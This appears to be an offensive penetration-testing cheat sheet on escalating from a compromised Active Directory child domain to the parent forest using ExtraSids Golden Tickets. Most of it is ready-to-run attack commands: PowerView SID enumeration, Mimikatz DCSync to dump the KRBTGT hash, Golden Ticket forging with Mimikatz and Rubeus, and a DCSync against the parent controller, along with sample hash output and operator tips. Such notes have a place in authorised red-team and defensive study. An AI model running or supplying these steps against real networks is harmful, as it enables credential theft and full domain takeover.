## Child to Parent Escalation via ExtraSids

Child domain administrative access is established and forest-wide persistence is required; **missing SID Filtering** between domains in the same forest allows the `sidHistory` attribute to be respected across trusts.

1. Identify the SID of the compromised child domain and the Enterprise Admins group in the parent domain.
2. Execute DCSync in the child domain to recover the KRBTGT account NT hash.
3. Forge a Golden Ticket in the child domain, injecting the parent Enterprise Admin SID into the `ExtraSids` field.
4. Inject the forged ticket into the current session to gain administrative access to the parent domain.
5. Verify access by listing the filesystem or performing DCSync against the parent Domain Controller.

---

## Enumeration and Data Collection

Administrative access in the child domain is required to extract the KRBTGT hash and group SIDs.

Obtain the current child domain SID

```
Get-DomainSID
```

Retrieve the SID for the Enterprise Admins group from the parent domain

```
Get-DomainGroup -Domain <PARENT_DOMAIN> -Identity "Enterprise Admins" | select distinguishedname,objectsid
```

Execute DCSync to extract the child KRBTGT NT hash

```
lsadump::dcsync /user:<DOMAIN>\krbtgt
```

Identify the hash and domain SID from the DCSync output to drive ticket forging

```
Object Security ID   : S-1-5-21-2806153819-209893948-922872689-502
Credentials:
Hash NTLM: 9d765b482771505cbe97411065964d5f
```

## Golden Ticket Forging (ExtraSids)

Access to the parent domain is denied until a forged ticket containing the parent's Enterprise Admin SID is injected into memory.

### Mimikatz

Forge and inject a Golden Ticket with ExtraSids for immediate session use

```
kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:<CHILD_DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /sids:<PARENT_EA_SID> /ptt
```

- Mimikatz -> `kerberos::golden ... /ptt` -> Prefer for all-in-one execution on the target host.

### Rubeus

Forge and inject a Golden Ticket using the RC4 hash

```
.\Rubeus.exe golden /rc4:<KRBTGT_HASH> /domain:<DOMAIN> /sid:<CHILD_DOMAIN_SID> /sids:<PARENT_EA_SID> /user:<USERNAME> /ptt
```

- Rubeus -> `golden ... /ptt` -> Prefer for C# based execution and better integration with automated post-exploitation frameworks.

## Access Verification and Post-Exploitation

A forged ticket exists in memory and must be validated against parent domain resources.

Confirm the forged ticket is present in the current session

```
klist
```

Test administrative access to the parent Domain Controller filesystem

```
ls \\<PARENT_DC_IP>\c$
```

Execute DCSync against the parent domain to compromise specific accounts

```
lsadump::dcsync /user:<PARENT_DOMAIN>\<USERNAME> /domain:<PARENT_DOMAIN>
```

**Dangerous / misconfigured settings**

- `sidHistory` attributes are trusted across domains within the same forest due to the **lack of SID Filtering**.
- Enterprise Admins group membership is determined by the SID present in the authentication token, regardless of actual group residency.

**Gotchas**

- **KRBTGT password changes** will immediately invalidate all forged Golden Tickets.
- **SID Filtering** if enabled across forest trusts will block the `ExtraSids` attribute, causing the escalation to fail.
- **Target domain mismatch** during DCSync requires the explicit `/domain` flag to point to the parent DC.